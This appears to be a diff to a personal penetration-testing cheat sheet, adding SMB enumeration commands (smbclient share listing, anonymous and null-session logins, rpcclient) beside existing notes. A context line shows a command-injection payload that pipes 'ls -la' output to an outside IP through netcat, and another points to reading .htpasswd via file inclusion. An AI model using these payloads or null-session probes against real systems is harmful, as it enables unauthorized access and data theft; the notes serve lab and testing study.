@@ -66,6 +66,23 @@ ex: asdasd;ls -la | nc 10.8.102.36 1234
 27. Check for .htpasswd in LFI (/etc/apache2/.htpasswd or in other locations)
 
 
+## list shares
+`smbclient -L //[IP]`
+
+## try anonymous login
+`smbclient -N //[IP]/[sharename]`
+
+## try null authentication
+`smclient -U '' -N //[IP]/sharename`
+
+## try with rpcclient (when got in just google rpcclient commands)
+`rpcclient [ip]`
+
+## try with rpcclient with null authentication
+`rpcclient -U '' -N [IP]`
+
+
+
  
 **GPG**
 https://linux.101hacks.com/unix/gpg-command-examples/
